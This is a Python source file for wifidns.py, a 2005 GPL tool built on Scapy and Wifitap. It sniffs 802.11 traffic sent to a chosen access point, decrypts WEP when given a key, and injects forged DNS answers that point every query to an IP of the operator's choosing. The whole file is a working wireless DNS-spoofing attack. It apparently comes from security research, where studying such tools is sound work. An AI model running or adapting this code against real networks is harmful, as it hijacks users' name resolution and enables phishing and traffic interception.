#! /usr/bin/env python

########################################
#
# wifidns.py --- WiFi injection DNS answering tool based on Wifitap
#
# Copyright (C) 2005 Cedric Blancher <sid@rstack.org>
#
# This program is free software; you can redistribute it and/or modify it
# under the terms of the GNU General Public License version 2 as
# published by the Free Software Foundation; version 2.
#
# This program is distributed in the hope that it will be useful, but
# WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the GNU
# General Public License for more details.
#
#########################################

import os,sys,getopt,struct,re,string,logging

# Import Psyco if available to speed up execution
try:
	import psyco
	psyco.full()
except ImportError:
	print "Psyco optimizer not installed, running anyway..."
	pass

from socket import *
from fcntl  import ioctl
from select import select

logging.getLogger("scapy").setLevel(1)
from scapy  import Raw,Ether,PrismHeader,Dot11,Dot11WEP,LLC,SNAP,sendp,conf

# We want to build a DNS Query answering machine

from scapy  import IP,UDP,DNS,DNSRR

IN_IFACE  = "ath0"
OUT_IFACE = "ath0"
HAS_SMAC  = 0
SMAC      = ""
WEP       = 0
KEYID     = 0
DEBUG     = 0
VERB      = 0
TTL       = 64
BSSID     = ""
IPDNS     = ""
WEPKEY    = ""


def usage(status=0):
    print "Usage: wifidns -b <BSSID> -a <IP> [-o <iface>] [-i <iface>]"
    print "                          [-s <SMAC>] [-t <TTL>] [-w <WEP key>]"
    print "                          [-k <key id>]] [-d [-v]] [-h]"
    print "     -b <BSSID>    specify BSSID for injection"
    print "     -a <IP>       specify IP address for DNS answers"
    print "     -t <TTL>      Set TTL (default: 64)"
    print "     -o <iface>    specify interface for injection (default: ath0)"
    print "     -i <iface>    specify interface for listening (default: ath0)"
    print "     -s <SMAC>     specify source MAC address for injected frames"
    print "     -w <key>      WEP mode and key"
    print "     -k <key id>   WEP key id (default: 0)"
    print "     -d            activate debug"
    print "     -v            verbose debugging"
    print "     -h            this so helpful output"
    sys.exit(status)

opts = getopt.getopt(sys.argv[1:],"b:a:o:i:s:t:w:k:dvh")

for opt,optarg in opts[0]:
    if opt == "-b":
	BSSID = optarg
    elif opt == "-a":
        IPDNS = optarg
    elif opt == "-o":
	OUT_IFACE = optarg
    elif opt == "-i":
	IN_IFACE = optarg
    elif opt == "-s":
	HAS_SMAC += 1
	SMAC = optarg
    elif opt == "-w":
	WEP += 1
	WEPKEY = optarg
    elif opt == "-k":
	KEYID = int(optarg)
    elif opt == "-t":
	TTL = int(optarg)
    elif opt == "-d":
	DEBUG += 1
    elif opt == "-v":
	VERB += 1
    elif opt == "-h":
	usage()

if not BSSID:
    print "\nError: BSSID not defined\n"
    usage()

if not IPDNS:
    print "\nError: IP not defined\n"
    usage()

# Match and parse BSSID
if re.match('^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', BSSID):
    BSSID = BSSID.lower()
else:
    print "\nError: Wrong format for BSSID\n"
    usage()

if HAS_SMAC:
    if not SMAC:
	print "\nError: SMAC not defined\n"
	usage()
    # Match and parse SMAC
    elif re.match('^([0-9a-fA-F]{2}:){5}[0-9a-fA-F]{2}$', SMAC):
	SMAC = SMAC.lower()
    else:
	print "\nError: Wrong format for SMAC\n"
	usage()

# Match and parse IP
if not re.match('^(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])\.(\d|[1-9]\d|1\d\d|2[0-4]\d|25[0-5])$', IPDNS):
    print "\nError: Wrong IP address\n"
    usage()

print "IN_IFACE:   %s" % IN_IFACE
print "OUT_IFACE:  %s" % OUT_IFACE
print "BSSID:      %s" % BSSID
if HAS_SMAC:
    print "SMAC:       %s" % SMAC
print "IP:         %s" % IPDNS

if WEP:
    # Match and parse WEP key
    tmp_key = ""
    if re.match('^([0-9a-fA-F]{2}){5}$', WEPKEY) or re.match ('^([0-9a-fA-F]{2}){13}$', WEPKEY):
	tmp_key = WEPKEY
    elif re.match('^([0-9a-fA-F]{2}[:]){4}[0-9a-fA-F]{2}$', WEPKEY) or re.match('^([0-9a-fA-F]{2}[:]){12}[0-9a-fA-F]{2}$', WEPKEY):
	tmp_key = re.sub(':', '', WEPKEY)
    elif re.match ('^([0-9a-fA-F]{4}[-]){2}[0-9a-fA-F]{2}$', WEPKEY) or re.match ('^([0-9a-fA-F]{4}[-]){6}[0-9a-fA-F]{2}$', WEPKEY):
	tmp_key = re.sub('-', '', WEPKEY)
    else:
	print "\nError : Wrong format for WEP key\n"
	usage()
    g = lambda x: chr(int(tmp_key[::2][x],16)*16+int(tmp_key[1::2][x],16))
    for i in range(len(tmp_key)/2):
	conf.wepkey += g(i)
    print "WEP key:    %s (%dbits)" % (WEPKEY, len(tmp_key)*4)
    if KEYID > 3 or KEYID < 0:
	print "Key id:     %s (defaulted to 0 due to wrong -k argument)" % KEYID
	KEYID = 0
    else:
	print "Key id:     %s" % KEYID
else:
    if KEYID != 0:
	print "WEP not activated, key id ignored"

print "TTL:        %s" % TTL

if not DEBUG:
    if VERB:
	print "DEBUG not activated, verbosity ignored"
else:
    print "DEBUG activated"
    if VERB:
	print "Verbose debugging"

conf.iface = OUT_IFACE

# Here we put a BPF filter so only 802.11 Data/to-DS frames are captured
s = conf.L2listen(iface = IN_IFACE,
    filter = "link[0]&0xc == 8 and link[1]&0xf == 1")

# Speed optimization si Scapy does not have to parse payloads
DNS.payload_guess=[]

try:
    while 1:
	dot11_frame = s.recv(2346)

	# WEP handling is automagicly done by Scapy if conf.wepkey is set
	# Nothing to do to decrypt
	# WEP frames have Dot11WEP layer, others don't
	if DEBUG and VERB:
	    if dot11_frame.haslayer(Dot11WEP): # WEP frame
		os.write(1,"Received WEP from %s\n" % IN_IFACE)
	    else: # Cleartext frame
		os.write(1,"Received from %s\n" % IN_IFACE)
	    os.write(1,"%s\n" % dot11_frame.summary())

	if dot11_frame.getlayer(Dot11).addr1 != BSSID:
	    continue

	# Identifying DNS Queries
	if dot11_frame.haslayer(DNS) and dot11_frame.getlayer(DNS).qr == 0:
	    if DEBUG:
		os.write(1,"Received DNS Query on %s\n" % IN_IFACE)
		if VERB:
		    os.write(1,"%s\n" % dot11_frame.summary())

	# Building DNS Reply answer for injection
	    dot11_answer = Dot11(
		type = "Data",
		FCfield = "from-DS",
		addr1 = dot11_frame.getlayer(Dot11).addr2,
		addr2 = BSSID)
	    if not HAS_SMAC:
	        dot11_answer.addr3 = dot11_frame.getlayer(Dot11).addr1
	    else:
		dot11_answer.addr3 = SMAC
	    if WEP:
		dot11_answer.FCfield |= 0x40
		dot11_answer /= Dot11WEP(
		    iv = "111",
		    keyid = KEYID)
	    dot11_answer /= LLC(ctrl = 3)/SNAP()/IP(
		src = dot11_frame.getlayer(IP).dst,
		dst = dot11_frame.getlayer(IP).src,
		ttl = TTL)
	    dot11_answer /= UDP(
		sport = dot11_frame.getlayer(UDP).dport,
		dport = dot11_frame.getlayer(UDP).sport)
	    dot11_answer /= DNS(
		id = dot11_frame.getlayer(DNS).id,
		qr = 1,
		qd = dot11_frame.getlayer(DNS).qd,
		an = DNSRR(
		    rrname = dot11_frame.getlayer(DNS).qd.qname,
		    ttl = 10,
		    rdata = IPDNS)
		)

	    if DEBUG:
		os.write(1,"Sending DNS Reply on %s\n" % OUT_IFACE)
		if VERB:
		    os.write(1,"%s\n" % dot11_frame.summary())

	# Frame injection :
		sendp(dot11_answer,verbose=0) # Send frame

# Program killed
except KeyboardInterrupt:
    print "Stopped by user."

s.close()

sys.exit()
